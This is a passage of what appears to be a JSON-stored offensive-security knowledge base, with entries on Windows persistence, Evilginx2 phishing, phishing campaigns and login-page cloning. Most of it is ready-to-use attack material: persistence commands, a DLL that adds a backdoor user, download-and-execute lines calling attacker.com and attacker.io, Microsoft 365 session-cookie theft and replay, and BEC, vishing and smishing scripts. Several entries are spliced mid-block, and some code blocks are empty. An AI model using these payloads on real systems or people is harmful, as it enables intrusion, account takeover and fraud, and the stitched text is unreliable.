reboot\n```", "last_updated": "2026-03-17"}, "windows-persistence": {"slug": "windows-persistence", "title": "Windows Persistence Techniques", "category": "Persistence", "content": "# Windows Persistence Techniques\n\nMaintaining access to compromised Windows systems across reboots, user logoffs, and service restarts.\n\n## Registry Run Keys\n\nThe most common persistence mechanism — execute a payload at user logon:\n\n```cmd\n:: Per-user (no admin required)\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\payload.exe\" /f\n\n:: Machine-wide (requires admin)\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\ProgramData\\payload.exe\" /f\n\n:: RunOnce (executes once, then deleted)\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"Setup\" /t REG_SZ /d \"payload.exe\" /f\n```\n\n**Detection**: Autoruns, Sysmon Event 13 (registry value set), EDR registry monitoring. Very well-known — use only when stealth is not critical.\n\n## Startup Folder\n\n```cmd\n:: Per-user\ncopy payload.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n:: All users (admin required)\ncopy payload.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n```\n\n## Scheduled Tasks\n\n```cmd\n:: Create task running as SYSTEM at logon\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\ProgramData\\update.exe\" /sc onlogon /ru SYSTEM /f\n\n:: Trigger every 15 minutes\nschtasks /create /tn \"Maintenance\" /tr \"C:\\ProgramData\\svc.exe\" /sc minute /mo 15 /ru SYSTEM /f\n```\n\n**Detection**: Event 4698 (task created), Sysmon Event 1 with parent `svchost.exe -k netsvcs -p -s Schedule`.\n\n## Windows Services\n\n```cmd\n:: Install as service\nsc create \"WindowsUpdateSvc\" binPath= \"C:\\ProgramData\\svc.exe\" start= auto DisplayName= \"Windows Update Service\"\nsc description \"WindowsUpdateSvc\" \"Manages Windows Update operations\"\n\n:: Using NSSM for non-service executables\nnssm install MyService C:\\ProgramData\\payload.exe\n```\n\n**Detection**: Event 7045 (new service installed), Event 4697. Services are heavily monitored.\n\n## WMI Event Subscriptions\n\nFileless persistence via permanent WMI consumers:\n\n```powershell\n# Event filter (trigger condition)\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n Name = \"UpdateFilter\"\n EventNamespace = \"root\\cimv2\"\n QueryLanguage = \"WQL\"\n Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n\n# Consumer (action to take)\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n Name = \"UpdateConsumer\"\n CommandLineTemplate = \"C:\\ProgramData\\payload.exe\"\n}\n\n# Binding (connect trigger to action)\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n Filter = $filter\n Consumer = $consumer\n}\n```\n\n**Detection**: WMI repository forensics, Sysmon Event 19/20/21 (WMI events). Harder to detect than registry/services but well-known to defenders.\n\n## DLL Hijacking / Side-Loading\n\nPlace a malicious DLL in the search path of a legitimate application:\n\n1. Identify target application with Process Monitor (look for DLL NOT FOUND results)\n2. Create DLL that proxies calls to the legitimate DLL while executing payload\n3. Place in application directory (searched before system directories)\n\n**Phantom DLL**: Some Windows services attempt to load DLLs that don't exist. Place your DLL where Windows will find it.\n\n**DLL Proxying**: Forward all exported functions to the real DLL while adding malicious code in DllMain. Tools: **SharpDLLProxy**, **DLLirant**.\n\n## COM Object Hijacking\n\nHKCU COM registrations override HKLM, allowing unprivileged persistence:\n\n```cmd\n:: Hijack a COM object loaded by Explorer or other processes\nreg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InProcServer32\" /ve /t REG_SZ /d \"C:\\Users\\user\\evil.dll\" /f\nreg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InProcServer32\" /v \"ThreadingModel\" /t REG_SZ /d \"Both\" /f\n```\n\nFind target CLSIDs by monitoring Explorer.exe COM loads with Process Monitor.\n\n## Accessibility Features Backdoor\n\nReplace accessibility binaries invoked from the login screen (requires SYSTEM):\n\n```cmd\n:: Image File Execution Options debugger — more subtle than file replacement\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f\n\n:: Targets: sethc.exe (Sticky Keys), utilman.exe (Utility Manager), osk.exe (On-Screen Keyboard)\n:: Trigger from login screen: press Shift 5 times, or Win+U\n```\n\n## LSA Security Support Provider\n\nRegister a custom SSP that captures plaintext credentials at logon:\n\n```cmd\n:: Mimikatz in-memory SSP (captures creds to C:\\Windows\\System32\\mimilsa.log)\nmisc::memssp\n\n:: Persistent SSP via registry\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"mimilib\" /f\n:: Place mimilib.dll in System32\n```\n\n## BITS Jobs\n\nBackground Intelligent Transfer Service for persistent download-and-execute:\n\n```cmd\nbitsadmin /create /download persistence\nbitsadmin /addfile persistence http://attacker.com/payload.exe C:\\ProgramData\\update.exe\nbitsadmin /SetNotifyCmdLine persistence C:\\ProgramData\\update.exe NUL\nbitsadmin /resume persistence\n```\n\nBITS jobs survive reboots and are less commonly monitored than registry/services.\n\n## Office Add-ins and Templates\n\n```cmd\n:: Word startup template (loads every time Word opens)\ncopy evil.dotm \"%APPDATA%\\Microsoft\\Word\\STARTUP\\\"\n\n:: Excel XLSTART\ncopy evil.xla \"%APPDATA%\\Microsoft\\Excel\\XLSTART\\\"\n\n:: Outlook add-in persistence via COM registration\n```\n\n## Print Monitor DLL\n\n```cmd\n:: Register a print monitor DLL (loaded by spoolsv.exe as SYSTEM)\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor\" /v Driver /t REG_SZ /d \"evil.dll\" /f\n:: Place evil.dll in System32, restart spooler service\n```\n\n## Active Setup\n\nRuns commands once per user at first logon, even for new users:\n\n```cmd\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{GUID}\" /v StubPath /t REG_SZ /d \"C:\\ProgramData\\payload.exe\" /f\n```\n\n## PowerShell Profile\n\n```powershell\n# Executes every time PowerShell starts for the user\necho 'Start-Process C:\\ProgramData\\payload.exe -WindowStyle Hidden' >> $PROFILE\n```\n\n## AppInit_DLLs\n\n```cmd\n:: Loaded into every process that loads user32.dll (most GUI processes)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\ProgramData\\evil.dll\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f\n```\n\nNote: Disabled by default on Windows 8+ with Secure Boot enabled.\n\n## OpSec Comparison\n\n| Technique | Stealth | Survives Reboot | Admin Required | Detection Difficulty |\n|-----------|---------|-----------------|----------------|---------------------|\n| Registry Run | Low | Yes | No (HKCU) | Easy |\n| Scheduled Task | Low | Yes | No (user) | Easy |\n| WMI Subscription | Medium | Yes | Yes | Medium |\n| COM Hijack | High | Yes | No | Hard |\n| DLL Side-Load | High | Yes | Depends | Hard |\n| Print Monitor | High | Yes | Yes | Hard |\n| BITS Job | Medium | Yes | No | Medium |\n\nPrefer COM hijacking and DLL side-loading for stealth. Layer multiple persistence mechanisms for resilience.\n\n---\n\n## Time Provider DLL\n\nThe Windows Time service (W32Time) loads Time Provider DLLs — a stealthy persistence mechanism:\n\n```c\n// malicious_timeprovider.dll — implement required exports\n// DllEntryPoint called when service starts\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n if (fdwReason == DLL_PROCESS_ATTACH) {\n // Payload executes as SYSTEM (W32Time service context)\n WinExec(\"cmd /c net user backdoor P@ss123! /add\", SW_HIDE);\n }\n return TRUE;\n}\n// TimeProvOpen, TimeProvCommand, TimeProvClose exports needed (can be stubs)\n\n// Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\\n// Add key: NtpClient → DllName = C:\\Windows\\System32\\malicious.dll\n// Trigger: sc stop w32time && sc start w32time (or reboot)\n```\n\n---\n\n## Netsh Helper DLL\n\n```cmd\nREM Netsh loads helper DLLs — add malicious one\nREM Requires SYSTEM or local admin\nreg add \"HKLM\\SOFTWARE\\Microsoft\\NetSh\" /v \"MalHelper\" /t REG_SZ /d \"C:\\Windows\\Temp\\helper.dll\"\n\nREM Triggers when netsh.exe is run (common in network diagnostics, troubleshooting scripts)\nREM DLL must export InitHelperDll()\n```\n\n---\n\n## Screensaver Persistence\n\n```powershell\n# Screensaver is an executable (.scr = renamed .exe) launched by winlogon.exe\n# At workstation lock after timeout (runs as current user)\n\n# Replace/set screensaver to payload\nreg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\Windows\\Temp\\payload.scr\"\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d \"1\"\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d \"0\"\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d \"60\" # 60 second timeout\n\n# Trigger: leave workstation idle 60s → screensaver (payload) executes\n# Stealthy: runs as user, natural trigger, no admin required\n```", "last_updated": "2026-03-17"}, "evilginx2-phishlets": {"slug": "evilginx2-phishlets", "title": "Evilginx2 Phishlets", "category": "Phishing", "content": "# Evilginx2 Phishlets — Complete Reference\n\nEvilginx2 is a man-in-the-middle attack framework that proxies traffic between victim and the real authentication service, capturing session cookies after MFA completion. Unlike static clones, it provides full transparency to the victim — they interact with the real site through Evilginx's proxy.\n\n## Architecture\n\n```\nVictim Browser ──HTTPS──> Evilginx2 (VPS) ──HTTPS──> Real Site (Microsoft/Google/etc)\n │\n Captures cookies\n Captures credentials\n Serves phishlet-defined modified responses\n```\n\nEvilginx terminates TLS for the phishing domain, proxies to the real domain, rewrites host headers and response bodies (per phishlet sub_filters), and captures auth cookies when they match phishlet `auth_tokens` patterns.\n\n## Infrastructure Requirements\n\n```bash\n# VPS: Ubuntu 22.04 minimum\n# Ports open: 53 (DNS), 80 (HTTP→HTTPS redirect), 443 (HTTPS phishing)\n# DNS records (at registrar):\n# A login.attacker.io → VPS_IP\n# A *.attacker.io → VPS_IP (wildcard for phishlet subdomains)\n# Note: Do NOT use Cloudflare proxy (orange cloud) — Evilginx serves its own TLS\n\n# Install Go 1.21+\nwget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz\ntar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz\nexport PATH=$PATH:/usr/local/go/bin\n\n# Install Evilginx2\ngit clone https://github.com/kgretzky/evilginx2 && cd evilginx2\nmake\n\n# Or install binary\nwget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.tar.gz\n```\n\n## Evilginx2 Console\n\n```bash\n# Start (must run as root — binds ports 53, 80, 443)\nsudo ./evilginx2 -p ./phishlets/ -developer\n\n# Production (no -developer: enables Let's Encrypt cert provisioning)\nsudo ./evilginx2 -p ./phishlets/\n\n# Core configuration\nconfig domain attacker.io # base domain\nconfig ipv4 45.77.X.X # your VPS IP\nconfig unauth_url https://google.com # where unauthenticated visitors go\n\n# Phishlet management\nphishlets # list available phishlets\nphishlets hostname o365 attacker.io # set hostname for phishlet\nphishlets enable o365 # enable (triggers Let's Encrypt cert request)\nphishlets disable o365\n\n# Lure management\nlures create o365 # create a lure for o365 phishlet\nlures get-url 0 # get phishing URL for lure 0\nlures # list all lures\nlures edit 0 redirect_url https://portal.office.com # set post-capture redirect\nlures edit 0 og_title \"Microsoft Security Alert\" # OpenGraph title for link previews\nlures edit 0 bodies\ncredentials:\n username:\n key: 'login'\n search: '(.*)'\n type: 'post'\n password:\n key: 'passwd'\n search: '(.*)'\n type: 'post'\n\n# Landing page (where victim is directed when they visit lure URL)\nlogin:\n domain: 'login.microsoftonline.com'\n path: '/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_type=id_token&scope=openid%20profile&response_mode=form_post&nonce=nonce'\n\n# Force cookie setting for session Phishlet\n\n### Step 1: Map the Authentication Flow\n\n```bash\n# Use browser DevTools Network tab, filter by domain\n# Navigate through login flow; record:\n# 1. All domains involved (login page, OAuth, MFA, redirect)\n# 2. POST body fields for username/password\n# 3. Final cookies set after successful auth\n# 4. Redirects and callback URLs\n\n# Useful: mitmproxy to intercept and inspect\nmitmproxy --mode regular --listen-port 8080\n# Browse via proxy; export HAR for analysis\n```\n\n### Step 2: Identify Auth Cookies\n\n```javascript\n// In browser console after successful auth:\ndocument.cookie.split(';').map(c => c.trim())\n\n// Or check Application > Cookies in DevTools\n// Target: cookies that survive tab close (persistent)\n// These are the ones Evilginx needs to capture for session replay\n```\n\n### Step 3: Minimal Phishlet Template\n\n```yaml\nname: 'target-app'\nauthor: 'operator'\nmin_ver: '3.0.0'\n\nproxy_hosts:\n - {phish_sub: 'auth', orig_sub: 'auth', domain: 'target.com',\n session: true, is_landing: true, auto_filter: true}\n\nsub_filters:\n - {triggers_on: 'auth.target.com',\n orig_sub: 'auth', domain: 'target.com',\n search: 'auth\\.target\\.com',\n replace: 'auth.attacker.io',\n mimes: ['text/html', 'application/javascript', 'application/json']}\n\nauth_tokens:\n - domain: '.target.com'\n keys: ['session_token', 'auth_cookie']\n\ncredentials:\n username:\n key: 'username' # POST body field name\n search: '(.*)'\n type: 'post'\n password:\n key: 'password'\n search: '(.*)'\n type: 'post'\n\nlogin:\n domain: 'auth.target.com'\n path: '/login'\n```\n\n### Step 4: Debug Mode Testing\n\n```bash\n# Start in developer mode (self-signed certs, no LE)\nsudo ./evilginx2 -p phishlets/ -developer\n\n# Enable verbose logging\nconfig debug true\n\n# Test with local /etc/hosts override\necho \"127.0.0.1 auth.attacker.io\" >> /etc/hosts\n\n# Watch Evilginx logs for:\n# - \"proxy: request → target\" (proxying correctly)\n# - \"auth_token captured\" (tokens being extracted)\n# - sub_filter rewrites happening in responses\n```\n\n## Session Token Replay\n\nAfter Evilginx captures session cookies:\n\n### Method 1: EditThisCookie Browser Extension\n1. Open browser, navigate to real site (logout first)\n2. Open EditThisCookie\n3. Import JSON array of captured cookies from Evilginx `sessions ` output\n4. Refresh — you are now authenticated as victim\n\n### Method 2: Cookie-Editor or DevTools\n```javascript\n// In browser console, set each captured cookie:\ndocument.cookie = \"ESTSAUTH=VALUE; domain=.microsoftonline.com; path=/; secure\";\n// Repeat for each auth_token captured\n```\n\n### Method 3: cURL / API Access (M365 example)\n```bash\n# Extract Bearer token from captured session (O365)\n# Evilginx captures OAuth tokens in some flows\n\n# Access Microsoft Graph with captured token\ncurl -H \"Authorization: Bearer CAPTURED_ACCESS_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me\"\n\ncurl -H \"Authorization: Bearer CAPTURED_ACCESS_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me/messages?\\$top=10\"\n\n# Use captured cookies with curl\ncurl -b \"ESTSAUTH=VALUE; ESTSAUTHPERSISTENT=VALUE\" \\\n \"https://portal.office.com\"\n```\n\n### Method 4: Playwright/Puppeteer Automation\n```python\nfrom playwright.sync_api import sync_playwright\n\nwith sync_playwright() as p:\n browser = p.chromium.launch()\n ctx = browser.new_context()\n # Better for quick one-off deployments; Evilginx2 for complex multi-domain auth flows.", "last_updated": "2026-03-15"}, "phishing-overview": {"slug": "phishing-overview", "title": "Phishing Overview", "category": "Phishing", "content": "# Phishing & Social Engineering Overview\n\nPhishing is the most prevalent initial access vector in real-world breaches — responsible for over 70% of successful enterprise compromises. Modern phishing has evolved far beyond simple email lures: today's campaigns blend technical precision (email authentication bypass, domain aging, JS injection), psychological manipulation, and multi-channel delivery to defeat both technical controls and human awareness training.\n\n## Cialdini's Principles Applied to Phishing\n\nRobert Cialdini's six principles of influence form the psychological backbone of every successful phish:\n\n| Principle | Application |\n|-----------|-------------|\n| **Authority** | Impersonate CEO, IT helpdesk, IRS, Microsoft. \"Your account requires immediate verification — IT Security Team\" |\n| **Urgency/Scarcity** | \"Your password expires in 2 hours.\" \"You have 1 unread security alert.\" Deadline triggers bypass analytical thinking |\n| **Social Proof** | \"Other employees in your team have already updated their credentials\" |\n| **Reciprocity** | Send a genuine-looking gift card, then follow up requesting action |\n| **Liking** | Personalize with target's name, LinkedIn data, mutual connections, local sports teams |\n| **Commitment** | Multi-step flows — small initial action (verify name) primes willingness to complete larger action (enter password) |\n\n**OSINT-driven personalization**: Use LinkedIn, Hunter.io, breach databases, and target's public posts to personalize beyond first name. Reference their manager's name, recent company announcements, or active projects. Spear phishing with personalization achieves 3–5× higher click rates vs generic campaigns.\n\n---\n\n## Email Infrastructure Setup\n\n### Domain Selection and Aging\n\n- **Aged domains**: Register domains 30–90 days before campaign. Fresh domains scored highly by spam filters.\n- **Domain look-alikes**: typosquatting (`microsofft.com`), subdomain abuse (`login.microsoft.com.corp-update.io`), hyphenation (`micro-soft-account.com`), additional TLDs (`corporate.co`, `corporate.net`)\n- **Pre-categorize**: Visit domain from residential IPs; submit to Cisco Talos, Barracuda, McAfee SiteAdvisor for categorization as \"business/finance\" before campaign\n\n### SPF, DKIM, DMARC Configuration\n\nThese are **mandatory** — without them, major providers reject or spam-folder 100% of email:\n\n```bash\n# SPF: authorize your sending server only\n_spf.attacker.io TXT \"v=spf1 ip4:45.77.X.X -all\"\n\n# DKIM: generate keypair\nopendkim-genkey -t -s mail -d attacker.io\n# Add public key to DNS:\nmail._domainkey.attacker.io TXT \"v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA...\"\n\n# DMARC: strict policy for legitimacy, or monitor-only\n_dmarc.attacker.io TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@attacker.io\"\n```\n\n### SMTP Setup\n\n```bash\n# Install Postfix on VPS\napt install postfix opendkim opendkim-tools -y\n\n# /etc/postfix/main.cf (key settings)\nmyhostname = mail.attacker.io\nsmtp_tls_security_level = may\nmilter_protocol = 2\nsmtpd_milters = inet:localhost:8891 # OpenDKIM\nnon_smtpd_milters = inet:localhost:8891\n\n# Warm up IP: send low-volume legitimate-looking emails first\n# Monitor deliverability via mail-tester.com (target: 10/10)\n```\n\n### Test Deliverability\n```bash\n# Check score before campaign\ncurl -s \"https://www.mail-tester.com/...\" # use mail-tester API\n# Check IP reputation\ncurl \"https://check.spamhaus.org/...\"\n# Verify headers land in inbox (not spam)\nswaks --to target@gmail.com --from noreply@attacker.io \\\n --server mail.attacker.io --auth-user postfix --auth-password X\n```\n\n---\n\n## GoPhish Campaign Workflow\n\nGoPhish is the standard open-source phishing campaign manager:\n\n### Setup\n```bash\nwget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip\nunzip gophish*.zip && chmod +x gophish\n# Edit config.json: set admin_server to 127.0.0.1, listen_url to 0.0.0.0:443\n./gophish &\n# Access admin: https://127.0.0.1:3333 (default admin/gophish)\n```\n\n### Campaign Components\n1. **Sending Profile** — SMTP host, from address, DKIM via Postfix relay\n2. **Email Template** — HTML body; `{{.FirstName}}`, `{{.URL}}`, `{{.TrackingURL}}` placeholders\n3. **Landing Page** — cloned login page; credential capture on submit; redirect to real site\n4. **User Groups** — CSV import: `First Name,Last Name,Email,Position`\n5. **Campaign** — link all above, set schedule (business hours for realism)\n\n### Tracking\nGoPhish tracks: email opened (pixel), link clicked (redirect through GoPhish), credentials submitted, campaign timeline. Results exportable as CSV/JSON for reporting.\n\n---\n\n## Whaling and Business Email Compromise (BEC)\n\nBEC targets executives and financial controllers with no malware — purely social engineering for wire transfer or data theft:\n\n### Common BEC Scenarios\n- **CEO fraud**: Attacker impersonates CEO, emails CFO requesting urgent wire transfer to new vendor\n- **Invoice manipulation**: Intercept legitimate vendor email thread, substitute bank account\n- **HR payroll redirect**: Email HR from spoofed employee address requesting direct deposit change\n- **Gift card**: CEO requests purchase of gift cards \"for client bonuses\", requests codes via reply\n\n### BEC Infrastructure\n- Use display name spoofing: From: `\"John Smith (CEO)\" ` — most email clients show name only\n- Register similar domain: `corp-name.co` vs `corp-name.com` — reply-to mismatch\n- If M365 compromised: send from legitimate compromised account (best deliverability)\n- Reference real business context from LinkedIn/company press releases\n\n---\n\n## Vishing (Voice Phishing)\n\n### Real-Time MFA Relay\nThe \"MFA fatigue + voice\" combo:\n1. Attacker starts login on real site → triggers OTP to victim's phone\n2. Attacker calls victim posing as IT: \"We detected suspicious login to your account. I need to verify — please read the 6-digit code you just received\"\n3. Victim reads OTP → attacker completes login before code expires\n\n### Vishing Pretexts\n- IT helpdesk: password reset, software install, security update\n- Bank fraud department: suspicious transaction, verify card details\n- Microsoft/Apple support: fake virus alert, need remote access\n- IRS/government: tax compliance, warrant, mandatory verification\n\n### Voice Spoofing\n```bash\n# SIP spoofing via VoIP provider (e.g., SpoofCard, Twilio with caller ID set)\n# For red team: use authorized VoIP trunk with spoofed caller ID\ntwilio calls create \\\n --from \"+12025551234\" \\ # spoof as target's IT helpdesk number\n --to \"+15551234567\" \\\n --url \"https://handler.attacker.io/vishing-script\"\n```\n\n---\n\n## Smishing (SMS Phishing)\n\n```bash\n# Twilio SMS campaign\nfrom twilio.rest import Client\nclient = Client(ACCOUNT_SID, AUTH_TOKEN)\nmessage = client.messages.create(\n body=\"[Alert] Your Microsoft account was accessed from Russia. Verify immediately: https://ms-acct-verify.io/login\",\n from_=\"+18005550199\", # short code or long code\n to=\"+15551234567\"\n)\n```\n\n**SMS delivery**: Short codes (5-6 digit) have high trust; 10DLC long codes require registration. For red team: use authorized carrier with purpose-registered numbers. SMS link shorteners (`bit.ly`, `tinyurl`) are now flagged — use aged domain with SSL.\n\n---\n\n## Microsoft Teams / Slack Phishing\n\nInternal messaging platforms have no email filtering:\n\n### Teams Phishing (External Invite)\n```python\n# M365 external messaging: any Teams user can message cross-tenant\n# Target: internal users who accept external contact requests\n# Pretext: \"Microsoft Security Alert\" from external tenant\n# Payload: link to external SharePoint with embedded redirect\n```\n\n### Teams GIF Attack (CVE-2020-1456 variant pattern)\n- Send malicious GIF that exfiltrates auth token when previewed in Teams\n- Modern: send link to SharePoint doc requiring re-auth (credential harvesting)\n\n### Slack Phishing\n- Create Slack workspace with company-looking name; invite target via email\n- Or exploit `/slack` integrations: phishing via Slackbot impersonation\n- Slack direct messages from compromised accounts: insider threat vector\n\n---\n\n## QR Code Phishing (Quishing)\n\nQR codes bypass URL scanners in email gateways (scanners can't click a QR code):\n\n```python\nimport qrcode\nqr = qrcode.make(\"https://login-secure.attacker.io/verify\")\nqr.save(\"verification.png\")\n```\n\n**Delivery**: Embed in email body as image, printed material, phishing landing page. Pretext: \"Scan to verify your account\" or \"Scan to access the secure portal.\" Mobile devices often have fewer security controls — no corporate proxy, no EDR.\n\n---\n\n## USB Drop / Physical Phishing\n\n**Rubber Ducky / BadUSB**:\n```bash\n# USB device emulates keyboard; types payload when inserted\n# DuckyScript:\nDELAY 1000\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.io/p')\"\nENTER\n```\n\n**USB drop methodology**:\n1. Drop in parking lot, lobby, restrooms of target facility\n3. ~50% of dropped drives get plugged in (per academic studies)\n4. Label drives: \"Confidential — HR Q1 2026\" for urgency\n\n---\n\n## Phishing Platforms and Tools\n\n| Tool | Use Case | Notes |\n|------|----------|-------|\n| **GoPhish** | Campaign management, tracking | Open source, easy setup |\n| **Evilginx2** | MFA bypass via reverse proxy | Captures session cookies |\n| **Modlishka** | Reverse proxy phishing | Single-host alternative to Evilginx |\n| **SET** | Social-Engineer Toolkit | All-in-one, site cloner, mass mailer |\n| **King Phisher** | Advanced campaign platform | Python, plugin support |\n| **Zphisher** | Quick page cloning | 30+ built-in templates |\n| **Gophish + Evilginx** | Combined: tracking + MFA bypass | Best of both worlds |\n| **Swaks** | SMTP testing | Verify deliverability pre-campaign |\n\n---\n\n## Phishing Detection and Defenses (Blue Team Context)\n\nUnderstanding defenses informs bypass:\n\n| Defense | Bypass |\n|---------|--------|\n| Email gateway URL scan | HTML attachment (smuggling), QR code, delayed URL activation |\n| SPF/DKIM/DMARC | Set up correctly on attacker domain; Two primary approaches exist: static cloning (fetch-and-modify HTML) and reverse proxy (Evilginx2/Modlishka). Choosing the right technique depends on the authentication flow complexity and whether MFA bypass is required.\n\n## Static Clone vs Reverse Proxy\n\n| Factor | Static Clone | Reverse Proxy (Evilginx2) |\n|--------|-------------|--------------------------|\n| MFA bypass | No — only captures username/password | Yes — captures post-MFA session cookie |\n| SPA/React apps | Poor — JS-rendered content missing | Excellent — full live proxy |\n| Setup complexity | Low | Medium (DNS + VPS) |\n| Detection risk | Low (no live connection to target) | Medium (traffic to target) |\n| Best for | Simple login forms, internal apps | O365, Google, Okta, any MFA target |\n\n## Static Clone Workflow\n\n### Step 1: Fetch with Realistic Headers\n```python\nimport httpx\n\nheaders = {\n 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',\n 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n 'Accept-Language': 'en-US,en;q=0.9',\n 'Accept-Encoding': 'gzip, deflate, br',\n}\n\nresp = httpx.get(target_url, headers=headers, follow_redirects=True, timeout=15)\nhtml = resp.text\n```\n\nRedirect following handles SSO flows, load balancers, and CDN rewrites.\n\n### Step 2: Asset Rewriting\nTwo strategies:\n- **Hotlink CDN assets** — keep absolute URLs to `cdn.microsoft.com` etc. (realistic, but requires internet)\n- **Download and host locally** — fully offline, no external dependencies\n\n```python\nfrom bs4 import BeautifulSoup\nimport re\n\nsoup = BeautifulSoup(html, 'html.parser')\n\n# Rewrite all absolute URLs to proxy through attacker server\nfor tag in soup.find_all(['img', 'script', 'link'], src=True):\n if tag.get('src', '').startswith('http'):\n tag['src'] = f\"/proxy?url={tag['src']}\"\nfor tag in soup.find_all('link', href=True):\n if tag.get('href', '').startswith('http'):\n tag['href'] = f\"/proxy?url={tag['href']}\"\n```\n\n### Step 3: JavaScript Injection\nInject credential capture hook before ``:\n```javascript\n\n```\n\n### Step 4: Multi-Step Form Handling\nMicrosoft O365 and Google use two-step flows (email → password). Handle with session storage:\n```javascript\n// Step 1: capture email\nsessionStorage.setItem('phish_user', emailField.value);\n// Step 2: capture password, combine, submit\nvar username = sessionStorage.getItem('phish_user');\n// POST both together to capture endpoint\n```\n\n## Evilginx2 Reverse Proxy (MFA Bypass)\n\nEvilginx2 acts as a transparent proxy between victim and real site. All traffic passes through, Evilginx captures session cookies after MFA completion.\n\n### Infrastructure Setup\n```bash\n# VPS: Ubuntu 22.04 with ports 80, 443, 53 open\n# DNS: A record for phishlet subdomain → VPS IP\n# A record: login.corporate-target.com → VPS (typosquat)\n# Wildcard: *.login.corporate-target.com → VPS\n\n# Install\ngo install github.com/kgretzky/evilginx2@latest\n\n# Run (binds to 53, 80, 443)\nsudo ./evilginx2 -p phishlets/ -developer\n```\n\n### Evilginx2 Configuration\n```\nconfig domain corporate-target.com\nconfig ipv4 \nphishlets hostname o365 corporate-target.com\nphishlets enable o365\nlures create o365\nlures get-url 0\n```\n\n### Phishlet YAML Structure\n```yaml\nname: 'office365'\nauthor: 'operator'\nmin_ver: '3.0.0'\nproxy_hosts:\n - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com',\n session: true, is_landing: true, auto_filter: true}\n - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com',\n session: false, is_landing: false}\nsub_filters:\n - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login',\n domain: 'microsoftonline.com', search: 'microsoftonline\\.com',\n replace: 'corporate-target.com', mimes: ['text/html','application/javascript']}\nauth_tokens:\n - domain: '.microsoftonline.com'\n keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'esctx']\n - domain: '.microsoft.com'\n keys: ['MC1', 'MSFPC']\ncredentials:\n username:\n key: 'login'\n search: '(.*)'\n type: 'post'\n password:\n key: 'passwd'\n search: '(.*)'\n type: 'post'\nlogin:\n domain: 'login.microsoftonline.com'\n path: '/common/oauth2/authorize'\n```\n\n### Session Token Replay\nAfter Evilginx captures tokens:\n```bash\n# In Evilginx2 console\nsessions # list captured sessions\nsessions 1 # view session 1 with cookies\n\n# Import captured cookies into browser via EditThisCookie extension\n# Or use with Microsoft Graph API\naz login --use-device-code # then replace tokens\n# Or: use captured Bearer token directly\ncurl -H \"Authorization: Bearer CAPTURED_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me/messages\"\n```\n\n**MFA bypass works because:** victim completes MFA on the *real* site via Evilginx proxy, real site issues authenticated session cookie, Evilginx captures it. MFA was completed legitimately — but attacker now holds the resulting session.\n\n## HTML Smuggling Delivery\n\nBypass email gateways (which scan URLs but not inline JavaScript blobs):\n```html\n\n\n\n\n\n\n```\n\nDeliver via email as `.html` attachment — gateway scans HTML statically, sees no URLs, passes through.\n\n## Captive Portal Phishing\n\nCombine evil twin + cloned captive portal for WiFi MITM:\n```bash\n# 1. extracting sensitive data from compromised environments while evading DLP and 